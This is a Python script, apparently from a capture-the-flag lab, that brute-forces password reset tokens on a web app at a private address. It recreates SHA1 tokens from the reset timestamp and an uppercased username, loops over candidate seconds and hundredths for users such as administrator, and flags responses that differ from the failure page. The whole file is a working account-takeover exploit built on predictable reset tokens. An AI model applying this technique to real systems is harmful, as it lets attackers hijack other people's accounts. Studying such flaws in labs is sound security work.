import requests
import hashlib
headers = {
    "User-Agent": "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1",
}

url = "http://10.10.40.36:8080/"
pasw = "http://10.10.40.36:8080/password_reset"
data = dict()
users = ["administrator","jane","clarice","admin","clocky_user"]

# data["username"] = user
# forgot = requests.post(pasw,data,allow_redirects=True, verify=False, headers=headers)

ti = "2024-10-04 06:34" # go to forgot password and reset the pasword of hte administrator user and take the time from the date header ); I can make it auto but I wanted to make sure of the seconeds!
x = 0
for user in users:
    for j in range(10,60):
        if j < 10:
             j = "0"+str(j)
        else:
            j = str(j)
        for i in range(100):
            if i < 10:
                i = "0"+str(i)
            else:
                i = str(i)

            token = ti+":"+j+"."+i+" . "+user.upper()
            token = hashlib.sha1(token.encode("utf-8")).hexdigest()

            data["token"] = token
            reset = requests.get(pasw,params=data,allow_redirects=True, verify=False, headers=headers)

            if(len(reset.text) != 22):
                print(token)
                print(reset.text)

            if x % 100 == 0:
                print(x)

            x += 1


